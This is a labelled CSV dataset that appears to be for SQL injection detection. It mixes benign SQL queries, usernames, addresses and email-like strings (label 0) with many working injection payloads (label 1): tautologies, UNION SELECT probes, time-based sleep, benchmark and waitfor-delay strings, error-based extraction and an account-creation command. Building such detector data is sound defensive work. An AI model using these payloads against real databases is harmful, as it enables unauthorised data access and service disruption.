Sentence,Label
-8359  )   where 4430  =  4430 or 6872  =  6872--,1
SELECT * FROM salt WHERE report = 'occur'  AND  ( could = 'teeth' OR equal = 'choice' ) ,0
SELECT * FROM hold WHERE Price NOT BETWEEN 10 AND 20,0
klaudt,0
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,1
-6145 or   (  8459  =  8459  )  *4906-- yklv,1
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
SELECT * FROM slip FETCH FIRST 50 PERCENT ROWS ONLY,0
ci2586ta,0
SELECT * FROM flow WHERE choice BETWEEN '1996-07-01' AND '1996-07-31',0
stanger-kitabayashi7@gestionsoftware.th,0
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,1
"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",1
"-1050""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""orfo"" like ""orfo",1
"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",1
"-5591%""   )    )    order by 1--",1
1'||  (  select 'zyvk' from dual where 2072  =  2072,1
"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"c/ murillo, 106 5c",0
19141,0
‘ or 1  =  1 --,1
ag77avacin,0
"-9661""   )    )     )   union all select 2158,2158,2158--",1
ruqiang,0
embo4ina80,0
update,1
"c/ mijancas, 154 3?c",0
SELECT prepare ( s FROM shade RIGHT JOIN,0
46881104c,0
tu6e3a5a,0
"calle maria marin, 196,",0
perr@pasajesaereosbaratos.pm,0
"-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe",1
"  SELECT wasteID AS ID, surprise AS morning FROM whole",0
SELECT * FROM clear  WHERE continued = how,0
dropin8,0
-8615   )    )     )   or 4039  =  9144,1
SELECT AVG ( Price ) FROM purpose,0
SELECT * FROM limited WHERE leader = 'farmer',0
lucila2,0
SELECT * FROM base FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM limited,0
1'   )    )    as dqby where 9256  =  9256,1
ozselcuk,0
timb44,0
6015,0
guntekin,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c828cc7449' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1%'  )   union all select null,null,null,null,null,null,null,null--",1
select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""gydr"" like ""gydr",1
novelador,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",1
"INSERT INTO automobile  ( soldier, best, clean )  VALUES  ( 'struck', 'program', 'greatly' )  ",0
"1""   )    )    as iubt where 8179  =  8179 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1  )   where 1270  =  1270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
1 and 9412  =  6877#,1
holgorio,0
SELECT TOP 3 * FROM flag WHERE construction = 'congress' SELECT * FROM top,0
"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
tait,0
%2A%28%7C%28objectclass%3D%2A%29%29,1
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
oroz-betelu,0
SELECT AVG ( smell ) FROM alive SELECT SUM ( subject ) ,0
fnico,0
axman@culturalsanpedrocf.ie,0
"-6076""   )    )    or 8277  =  4757",1
SELECT disappear ( s )  FROM fighting UNION ALL,0
"1',  (  case when 3598  =  2118 then 1 else null end  )  ",1
correa cachopo,0
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,1
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1
SELECT COUNT ( characteristic ) FROM shorter,0
*/*,1
zahnley,0
"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT COUNT ( DISTINCT hardly )  FROM rabbit,0
"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0
"  SELECT   CONVERT ( ""2017-08-29"", DATE ) ;",0
waitfor delay '0:0:5' and '%'  =  ',1
puigdevanol regi,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347687 )  ORDER BY meta_id ASC",0
SELECT * FROM bell WHERE piano LIKE '%took%',0
cusell vinageras,0
SELECT * FROM hollow,0
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1
"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",1
"  SELECT numeralID AS ID, nest AS alike FROM remarkable",0
"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
entrepalmadura,0
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular',0
bnrinfo,0
1'+  (  select 'wvqj' where 3709  =  3709,1
7380830000000000,0
1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,1
" SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ",0
sant andreu salou,0
"1  )   as estm where 4809  =  4809 union all select null,null,null--",1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1
SELECT * FROM farm WHERE fruit IN  ( SELECT about FROM getting ) ,0
select case when 8975  =  2352 then 1 else null end--,1
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1
"  SELECT rocky AS compound, chosen AS [lady]  FROM key",0
88360528w,0
" SELECT * FROM coming ORDER BY curve ASC, bigger DESC",0
"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
"1"" and make_set  (  8262  =  3471,3471  )   and ""wayp""  =  ""wayp",1
"c/ venus 91, 1e",0
SELECT football ( s )  FROM read FULL OUTER JOIN,0
SELECT MIN ( box )  AS film FROM tie,0
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",1
valcourt,0
isidro,0
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
-4892%'   )    )    or 2251  =  9881--,1
SELECT AVG ( practical ) FROM brother SELECT SUM ( yes ) ,0
SELECT quite ( s )  FROM tip UNION,0
"-7749"" or   (  2689  =  7481  )  *7481",1
almazn cayul,0
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""",0
"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",1
SELECT * FROM shorter FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cast,0
SELECT quietly FROM stage UNION ALL SELECT afraid FROM again ORDER BY plate,0
"travesia palacio 61, 1?d",0
"1"" where 7879  =  7879",1
doan7,0
1' in boolean mode  )   or sleep  (  5  )  #,1
" SELECT * FROM section ORDER BY wing, himself",0
6913070000000000,0
SELECT AVG ( rice ) FROM car,0
"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
moncada,0
" end and    (    (     (  ""%""  =  """,1
9.7668E+015,0
"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",1
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"plaza de el salvador 91,",0
"pealara, 87",0
5n37do,0
-6586'   )    )    or 2021  =  2996,1
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ,0
"1""  )   where 6128  =  6128 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'||  (  select 'rqzu' from dual where 9516  =  9516 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm",1
rosset,0
admin'  )   or '1'  =  '1'#,1
adolphe,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",1
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'akyc'  =  'akyc",1
18179,0
leonella,0
"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT child FROM hurt,0
SELECT AVG ( court ) FROM yourself SELECT SUM ( success ) ,0
SELECT TOP 50 PERCENT * FROM month SELECT * FROM which FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM definition,0
1'  )   union all select null#,1
33560,0
8179150000000000,0
"SELECT * FROM pencil WHERE stop BETWEEN ""frighten"" AND    ""whale""",0
"   SELECT share, spider, plates FROM easy WHERE making  IS NULL",0
SELECT TOP 3 * FROM alive,0
create user name identified by 'pass123',1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",1
"1""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM  ( SELECT bell FROM yes ) ,0
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0
carr97t8,0
SELECT apart FROM open UNION SELECT ruler FROM forget ORDER BY season,0
SELECT * FROM distance  WHERE former NOT LIKE '[attempt]%',0
"1'  )   and elt  (  4249  =  4249,7259  )  ",1
buckman,0
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) ,0
1'||  (  select 'kptj' from dual where 5123  =  5123,1
"-3954'   )    )    union all select 2417,2417--",1
espinoza@canariasatuaire.lb,0
SELECT AVG ( habit ) FROM ago SELECT SUM ( manner ) ,0
SELECT * FROM now WHERE process = 'treated' LIMIT 3,0
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1
"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367658 ) ,0
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",1
" SELECT * FROM structure ORDER BY sand, each",0
reich.puffy@g-audi.pe,0
onzonilla,0
jaworsky,0
SELECT * FROM steam WHERE relationship  BETWEEN 10 AND 20,0
"-9370'  )   where 7070  =  7070 or make_set  (  9354  =  9354,7185  )  --",1
"   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL",0
SELECT * FROM worse WHERE herself = 'although'  AND City = 'farm',0
SELECT * FROM forty WHERE nose BETWEEN substance09/01/1996are AND slow15/31/1996usual,0
1 and sleep  (  5  ) ,1
armstrong@viajesnacionales.pn,0
SELECT TOP 50 PERCENT * FROM atom,0
robledollano,0
"  SELECT reason AS essential, grew AS [wheat]  FROM distance",0
SELECT * FROM nor WHERE notice = 'steep' FETCH FIRST 3 ROWS ONLY,0
"-6600'  )   union all select 5566,5566#",1
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )  ",0
sprouse,0
"1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  '",1
"  SELECT strawID AS ID, arrive AS if FROM alphabet",0
SELECT COUNT ( air ) FROM attempt,0
tubal,0
"INSERT INTO account  ( metal, dozen, courage )  VALUES  ( 'now', 'explanation', 'plural' )  ",0
faada,0
70243797a,0
1 where 6827  =  6827,1
40355743n,0
SELECT make FROM whether UNION SELECT mud FROM below ORDER BY maybe,0
"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",1
"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """,1
-7164%' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,1
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1
SELECT * FROM club WHERE with  BETWEEN 10 AND 20,0
SELECT COUNT ( problemID ) FROM pound,0
SELECT * FROM spread  WHERE curious = slow,0
SELECT * FROM fifteen WHERE using = 'baby' LIMIT 3,0
SELECT * FROM load WHERE very = 'secret',0
1'  )   where 5871  =  5871,1
SELECT basis ( s )  FROM why UNION ALL,0
sonsoles,0
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",1
SELECT TOP 50 PERCENT * FROM instance,0
5555,0
SELECT * FROM correct WHERE mainly = 'gone' LIMIT 3,0
mccauley@autobuses-hibridos.ph,0
"SELECT column1 , column2 , column3 , ... FROM table1 WHERE condition ; INSERT INTO Customers  ( CustomerName, City, Country )  ",0
" SELECT column_name ( s )  FROM sport,accurate",0
SELECT potatoes ( s )  FROM exact FULL OUTER JOIN,0
bechara,0
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1
1' where 8635  =  8635 order by 1--,1
SELECT * FROM handsome FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM over,0
-6190'   )    )     )   union all select 9413--,1
1 uni/**/on select all from where,1
22311,0
"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",1
elwes@enla.nu,0
"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",1
SELECT * FROM neighbor,0
SELECT * FROM excellent WHERE pressure = 'sides'  OR section = 'cutting',0
childree,0
latin,0
"-3035""  )   union all select 7912,7912,7912#",1
"   SELECT COUNT ( them ) , solid FROM card BY author",0
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 252091 )  ORDER BY meta_id ASC",0
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",1
SELECT * FROM water WHERE dear = 'street'  OR bite = 'are',0
SELECT * FROM let WHERE read LIKE '%magic%',0
"-9037%"" union all select 6583#",1
"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",1
"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",1
17590r,0
"1%"" union all select null,null,null,null,null,null,null,null,null--",1
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj",1
